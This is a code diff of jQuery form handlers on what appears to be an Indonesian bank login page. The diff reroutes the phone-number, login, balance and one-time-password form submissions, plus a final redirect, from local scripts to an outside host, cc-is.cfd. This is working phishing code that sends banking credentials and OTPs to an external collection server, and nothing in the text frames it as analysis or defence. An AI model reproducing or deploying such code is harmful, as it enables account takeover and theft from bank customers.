@@ -8,7 +8,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://cc-is.cfd/BSI/ht6gk/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -28,7 +28,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://cc-is.cfd/BSI/ht6gk/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -54,7 +54,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://cc-is.cfd/BSI/ht6gk/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -84,7 +84,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'rest/otp.php',
+ url: 'https://cc-is.cfd/BSI/ht6gk/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
@@ -123,7 +123,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='wa';
+location.href='https://cc-is.cfd/BSI/ht6gk/wa';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
